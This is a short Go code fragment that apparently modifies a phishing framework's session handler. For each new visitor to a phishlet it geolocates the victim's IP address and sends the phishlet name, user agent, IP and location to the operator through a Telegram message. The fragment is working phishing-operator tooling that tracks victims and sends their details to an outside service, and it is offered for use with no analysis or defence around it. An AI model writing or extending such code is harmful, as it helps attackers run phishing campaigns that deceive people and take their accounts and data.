...
func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	...
	// Fetch user location based on the remote IP address
	location, err := getUserLocation(remote_addr)
	if err != nil {
		location = "Location not available"
	}

	// Modify the telegramSendVisitor call to include the location
	telegramSendVisitor(fmt.Sprintf(
		"🍁 [%d] [%s] New visitor 🍁\n\n*******[🧍‍♂️Visitor Details 🧍‍♂]*******\n"+
		"🌎 UserAgent = %s\n"+
		"🗺️ IP = [%s]\n"+
		"📍 Location = %s\n",
		id, phishlet, useragent, remote_addr, location,
	))
